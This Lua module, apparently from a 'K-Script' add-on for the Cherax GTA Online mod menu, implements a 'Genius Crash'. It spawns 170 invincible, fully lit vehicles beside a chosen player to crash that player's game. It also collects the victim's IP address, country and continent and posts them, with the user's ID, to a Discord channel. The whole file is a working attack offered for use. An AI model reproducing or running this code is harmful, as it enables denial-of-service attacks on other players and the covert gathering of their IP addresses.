local function createVehicleLightingSpawnSequenceModule(moduleContext)
    if type(moduleContext) ~= "table" or not moduleContext then
        moduleContext = {}
    end
    local terminalViolation = moduleContext.KSRuntimeTerminalViolation
    if type(terminalViolation) ~= "function" then
        error("player-feature terminal violation context invalid", 2)
    end
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runVehicleLightingSpawnSequence(lightingFeature, removalComplete)
        if onCrashCooldown and not isDev then
            notify("Another Crash is running, please wait for it to Finish!")
            return
        end
        local targetPlayerId = lightingFeature:GetPlayerIndex()
        if type(targetPlayerId) ~= "number" or targetPlayerId == GTA.GetLocalPlayerId() then
            return
        end
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if not targetGamerInfo then
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), Players.GetName(targetPlayerId)
                ))
                return
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" and not isDev then
            blacklistSound("forbidden_protected_runtime_target")
            SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), Players.GetName(targetPlayerId)
            ))
            return
        end
        local targetTags = tostring(Players.GetTags(targetPlayerId) or "")
        local targetIsFriend = string.find(targetTags, "[F]", 1, true) ~= nil
        local targetName = tostring(Players.GetName(targetPlayerId) or "Unknown")
        local function logLightingAttempt()
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetCountry = targetIpInfo and targetIpInfo.country or "Unknown"
            local targetContinent = targetIpInfo and targetIpInfo.continent or "Unknown"
            local targetIpObject = Players.GetIP(targetPlayerId)
            local targetIp = targetIpObject and targetIpObject:ToString(false) or "Unknown"
            SendToDiscord("lol", ("%s used Genius Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()), targetName, Cherax.GetUID(),
                tostring(isSupporter), tostring(targetIsFriend), tostring(targetCountry),
                tostring(targetContinent), tostring(targetIp)
            ))
        end
        Script.QueueJob(logLightingAttempt)
        if targetIsFriend and not isDev then
            terminalViolation("forbidden_friend_target")
            return
        end

        notify("Genius Crash running...")
        onCrashCooldown = true
        local localPed = PLAYER.PLAYER_PED_ID()
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(lightingFeature:GetPlayerIndex())
        local targetX, targetY, targetZ = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(targetPed, 0, 3, 0)
        local returnX, returnY, returnZ = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localPed, 0, 3, 0)
        local targetHeading = ENTITY.GET_ENTITY_HEADING(targetPed)
        local vehicleModel = Utils.Joaat("envisage")
        local spawnedVehicles = {}
        request_model(vehicleModel)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, targetX, targetY, targetZ + 185, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(localPed, true)
        Script.Yield(200)
        local driverPed = GTA.CreateRandomPed(targetX, targetY, targetZ)
        if ENTITY.DOES_ENTITY_EXIST(driverPed) then
            canMigrate(driverPed, false)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driverPed, true)
            ENTITY.SET_ENTITY_INVINCIBLE(driverPed, true)
        end
        for vehicleIndex = 1, 170 do
            targetHeading = ENTITY.GET_ENTITY_HEADING(targetPed)
            targetX, targetY, targetZ = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(targetPed, 0, 3, 0)
            local spawnedVehicle = GTA.SpawnVehicle(vehicleModel, targetX, targetY, targetZ + 55, targetHeading - 180, true, true)
            spawnedVehicles[vehicleIndex] = spawnedVehicle
            if ENTITY.DOES_ENTITY_EXIST(spawnedVehicle) then
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(spawnedVehicle, 2)
                ENTITY.SET_ENTITY_VISIBLE(spawnedVehicle, true)
                Script.Yield(10)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spawnedVehicle, targetX, targetY, targetZ, false, true, true)
                ENTITY.SET_ENTITY_INVINCIBLE(spawnedVehicle, true)
                PED.SET_PED_INTO_VEHICLE(driverPed, spawnedVehicle, -1)
                VEHICLE.SET_VEHICLE_ENGINE_ON(spawnedVehicle, true, true, false)
                VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(spawnedVehicle, true)
                for neonIndex = 0, 3 do
                    VEHICLE.SET_VEHICLE_NEON_ENABLED(spawnedVehicle, neonIndex, true)
                end
                VEHICLE.SET_AMBIENT_VEHICLE_NEON_ENABLED(spawnedVehicle)
                VEHICLE.SET_VEHICLE_MOD(spawnedVehicle, 22, 10, false)
                for modType = 17, 22 do
                    VEHICLE.TOGGLE_VEHICLE_MOD(spawnedVehicle, modType, true)
                end
                VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(spawnedVehicle, math.random(0, 12))
                VEHICLE.SET_VEHICLE_HAS_UNBREAKABLE_LIGHTS(spawnedVehicle, false)
                VEHICLE.SET_VEHICLE_LIGHTS(spawnedVehicle, 3)
                VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(spawnedVehicle, 3)
                VEHICLE.SET_VEHICLE_INTERIORLIGHT(spawnedVehicle, true)
                VEHICLE.SET_VEHICLE_FORCE_INTERIORLIGHT(spawnedVehicle, true)
                ENTITY.FREEZE_ENTITY_POSITION(spawnedVehicle, true)
            end
        end
        notify("Genius Crash completed, syncing...")
        Script.Yield(5000)
        onCrashCooldown = false
        if type(removalComplete) == "function" then
            removalComplete()
        end
        notify("Genius Crash completed, cleaning up...")
        ENTITY.FREEZE_ENTITY_POSITION(localPed, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, returnX, returnY, returnZ, false, false, false)
        for vehicleIndex = 1, #spawnedVehicles do
            DeleteEnt(spawnedVehicles[vehicleIndex])
            Script.Yield(0)
        end
        canMigrate(driverPed, true)
        DeleteEnt(driverPed)
    end

    local vehicleLightingSpawnSequenceRunner = { variant = "donator", feature = "vehlightCwash", slug = "vehlightcwash" }

    function vehicleLightingSpawnSequenceRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runVehicleLightingSpawnSequence(runContext.feature, runContext.__ksRemovalComplete)
    end

    return vehicleLightingSpawnSequenceRunner
end

return createVehicleLightingSpawnSequenceModule
